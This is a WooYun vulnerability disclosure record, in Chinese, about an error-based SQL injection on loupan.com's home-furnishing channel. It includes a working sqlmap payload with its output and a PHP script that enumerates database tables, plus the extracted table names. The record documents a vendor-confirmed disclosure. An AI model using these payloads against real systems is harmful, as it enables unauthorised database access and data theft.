{"id": 34371, "wybug_id": "wooyun-2015-0106520", "wybug_title": "楼盘网家居建材频道sql注入（附验证脚本）", "wybug_corp": "loupan.com", "wybug_author": "Pany自留地", "wybug_date": "2015-04-08 09:36", "wybug_open_date": "2015-05-23 10:28", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向公众公开  简要描述： error-based注入 可以获取敏感数据 详细说明：  注入点：\nhttp://jiaju.loupan.com/batch.common.php?action=modelquote&cid=1&name=spacecomments%20where%201=2\n\n---Parameter: name (GET)    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: action=modelquote&cid=1&name=spacecomments where 1=2 AND (SELECT 9965 FROM(SELECT COUNT(*),CONCAT(0x7162787071,(SELECT (CASE WHEN (9965=9965) THEN1 ELSE 0 END)),0x7162627071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- xClc---[09:08:20] [INFO] retrieved: 5.1.63-logweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0banner:    '5.1.63-log'[09:08:20] [INFO] retrieved: jiaju_loupan@localhostcurrent user:    'jiaju_loupan@localhost'[09:08:20] [INFO] retrieved: jiaju_loupancurrent database:    'jiaju_loupan'current user is DBA:    False\n验证脚本：获取表：\n<?phpfor($num=0;$num<=100;$num++){$sql_url = \"http://jiaju.loupan.com/batch.common.php/batch.common.php?action=modelquote&cid=1&name=spacecomments%20where%201=1%20and%201=(updatexml(0,concat(0x7e,(SELECT%20concat(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20limit%20${num},1)),0))--%20-\";$result1 = file_get_contents($sql_url);$match = preg_match('/~(.*)\\'/i',$result1,$result);echo $result[1].\"\\r\\n\";ob_flush();flush();}?>\n   漏洞证明：  表名：\necm_acategoryecm_addressecm_articleecm_attributeecm_brandecm_cartecm_category_goodsecm_category_storeecm_collectecm_couponecm_coupon_snecm_friendecm_functionecm_gcategoryecm_goodsecm_goods_attrecm_goods_imageecm_goods_qaecm_goods_spececm_goods_statisticsecm_groupbuyecm_groupbuy_logecm_mail_queueecm_memberecm_messageecm_moduleecm_navigationecm_orderecm_order_extmecm_order_goodsecm_order_logecm_pageviewecm_partnerecm_paymentecm_privilegeecm_recommendecm_recommended_goodsecm_regionecm_scategoryecm_sessionsecm_sessions_dataecm_sgradeecm_shippingecm_storeecm_uploaded_fileecm_user_couponecm_user_priv[Table]adminsession[Table]ads[Table]announcements[Table]attachments[Table]attachmenttypes[Table]blocks[Table]cache[Table]cache_0[Table]cache_1[Table]cache_2[Table]cache_3[Table]cache_4[Table]cache_5[Table]cache_6[Table]cache_7[Table]cache_8[Table]cache_9[Table]cache_a[Table]cache_b[Table]cache_c[Table]cache_d[Table]cache_e[Table]cache_f[Table]categories[Table]channels[Table]cities[Table]click[Table]clickgroup[Table]clickuser[Table]creditlog[Table]creditrule[Table]crons[Table]customfields[Table]forums[Table]friendlinks[Table]members[Table]modelcolumns[Table]modelfolders[Table]modelinterval[Table]models[Table]pages[Table]polls[Table]postitems[Table]postlog[Table]postmessages[Table]postset[Table]prefields[Table]reports[Table]robotitems[Table]robotlog[Table]robotmessages[Table]robots[Table]rss[Table]settings\n   修复方案：     版权声明：转载请注明来源 Pany自留地@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-04-08 10:27 厂商回复： 感谢您对本网站的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}